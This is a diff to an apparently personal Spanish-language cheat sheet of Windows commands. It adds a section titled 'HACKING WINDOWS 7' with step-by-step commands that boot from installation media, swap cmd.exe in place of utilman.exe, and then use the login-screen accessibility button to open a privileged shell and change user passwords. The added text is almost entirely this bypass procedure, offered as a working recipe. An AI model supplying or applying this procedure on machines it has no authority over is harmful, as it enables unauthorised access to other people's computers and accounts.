@@ -1,4 +1,17 @@
 ##############################################################################
+# HACKING WINDOWS 7
+##############################################################################
+>Entrar con una unidad de instalacion
+>Oprimir shift+f10
+>cd c:\windows\system32
+>copy cmd.exe cmd2.exe
+>ren utilman.exe utilman2.exe
+>ren cmd.exe utilman.exe
+>reiniciamos y oprimimos el boton de utilidades
+>ejecutar control userpasswords2
+
+
+##############################################################################
 # attrib
 ##############################################################################
 >cambia los permisos de archivos
